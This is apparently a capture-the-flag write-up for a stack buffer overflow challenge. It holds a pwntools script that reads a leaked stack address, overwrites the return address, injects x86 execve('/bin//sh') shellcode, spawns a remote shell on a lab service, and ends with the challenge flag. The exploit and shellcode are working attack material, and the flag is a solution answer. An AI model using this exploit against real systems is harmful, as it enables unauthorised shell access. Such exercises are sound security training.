It is time to write your own shellcode!

192.168.210.11:10002

Recommend reading: Smashing The Stack For Fun And Profit

PS: ASLR is disabled

```
# -*- coding: utf-8 -*-
from pwn import *

# Io = process("shellcode")
Io = remote("192.168.210.11", 10002)

data = Io.read()
addr = int(data.split("at ")[1].split(". ")[0][2:], 16)
junk = "A" * 44
shellcode = "\x31\xc9\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
shellcode_addr = p32(addr + len(junk) + 4)
payload = junk + shellcode_addr + shellcode
Io.send(payload)

Io.interactive()
```

```
flag{smashing_the_stack_for_fun_and_profit_by_Aleph_One}
```